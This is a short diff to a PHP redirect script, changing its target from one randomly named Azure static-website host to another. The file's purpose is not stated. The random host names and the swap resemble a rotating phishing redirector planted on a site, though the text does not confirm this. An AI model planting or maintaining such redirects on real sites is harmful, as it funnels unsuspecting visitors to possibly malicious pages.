@@ -1,5 +1,5 @@
 <?php
-$url = "https://ye11kya2hua8.z36.web.core.windows.net/";
+$url = "https://diff3rance9fx8i.z12.web.core.windows.net/";
 header('Location: '.$url);
 die();
 ?>
